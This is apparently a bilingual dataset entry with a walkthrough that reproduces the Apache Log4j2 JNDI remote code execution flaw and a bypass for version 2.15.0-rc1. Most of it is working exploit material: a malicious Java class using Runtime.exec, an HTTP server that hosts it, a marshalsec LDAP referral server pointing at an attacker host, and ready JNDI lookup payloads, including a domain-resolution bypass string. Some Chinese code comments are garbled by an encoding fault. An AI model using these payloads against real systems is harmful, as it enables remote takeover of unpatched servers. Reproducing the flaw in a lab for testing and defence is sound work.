title.zh: Apache Log4j2 远程代码执行复现：从基础到绕过
title.en: Apache Log4j2 Remote Code Execution Walkthrough: From Basics to Bypass

description.zh: 详细介绍 Apache Log4j2 远程代码执行漏洞的复现过程，包括环境准备、payload 构造、LDAP/RMI 服务搭建，以及 2.15.0-rc1 版本的绕过方法。
description.en: Detailed walkthrough of Apache Log4j2 remote code execution vulnerability reproduction, including environment preparation, payload construction, LDAP/RMI service setup, and bypass methods for version 2.15.0-rc1.

content.zh: 如何复现 Log4j2 RCE 漏洞？
content.en: How to reproduce Log4j2 RCE vulnerability?

annotation.zh: 用户请求漏洞复现指导

codeBlocks.code:
> java -version
java version "1.8.0_181"
Java(TM) SE Runtime Environment (build 1.8.0_181-b13)
Java HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)
# 鍚疞DAP鏈嶅姟锛?$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.3.64/#dnslog"

# 鍚痟ttp锛?$ python3 -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...

<?xml version="1.0" encoding="UTF-8"?>
<configuration status="OFF" monitorInterval="30">
  <appenders>
    <console name="Console" target="SYSTEM_OUT">
      <PatternLayout pattern="%m{lookups}%n"/>
    </console>
  </appenders>

  <loggers>
    <root level="all">
      <appender-ref ref="Console"/>
    </root>
  </loggers>
</configuration>

content.zh: 复现环境准备：1) 准备 demo.jar 或 idea 代码调试环境；2) JDK 版本需低于 11，推荐 1.8.0_181；3) 受影响版本：Log4j 2.x <= 2.15.0-rc1。使用 JD-GUI 反编译 demo.jar，分析代码发现 /hello 路由接收 payload 参数并使用 logger.error 记录。
content.en: Reproduction environment preparation: 1) Prepare demo.jar or idea code debugging environment; 2) JDK version needs to be below 11, recommend 1.8.0_181; 3) Affected versions: Log4j 2.x <= 2.15.0-rc1. Use JD-GUI to decompile demo.jar, analyze code to find /hello route receives payload parameter and uses logger.error to record.

content.zh: Payload 构造流程：1) 编写恶意 Java 类 dnslog.java，使用 Runtime.exec 执行命令；2) 编译生成 dnslog.class；3) 启动 HTTP 服务提供恶意类下载：python3 -m http.server 80；4) 启动 LDAP 服务：java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://192.168.3.64/#dnslog"；5) 发送 payload：${jndi:ldap://192.168.3.64:1389/dnslog}。
content.en: Payload construction process: 1) Write malicious Java class dnslog.java, use Runtime.exec to execute commands; 2) Compile to generate dnslog.class; 3) Start HTTP service to provide malicious class download: python3 -m http.server 80; 4) Start LDAP service: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://192.168.3.64/#dnslog"; 5) Send payload: ${jndi:ldap://192.168.3.64:1389/dnslog}.

content.zh: 2.15.0-rc1 绕过方法：修改 pom.xml 将版本改为 2.15.0-rc1，添加 log4j2.xml 配置文件，设置 PatternLayout pattern 为 %m{lookups}%n 开启 lookup 功能。绕过 payload：${jndi:ldap://127.0.0.1#.4ra1n.love:1389/badClassName}，通过域名解析绕过限制。限制：高版本 JDK 会报错 Reference Class Name: foo。
content.en: 2.15.0-rc1 bypass method: Modify pom.xml to change version to 2.15.0-rc1, add log4j2.xml configuration file, set PatternLayout pattern to %m{lookups}%n to enable lookup function. Bypass payload: ${jndi:ldap://127.0.0.1#.4ra1n.love:1389/badClassName}, bypass restrictions through domain name resolution. Limitation: High version JDK will report error Reference Class Name: foo.
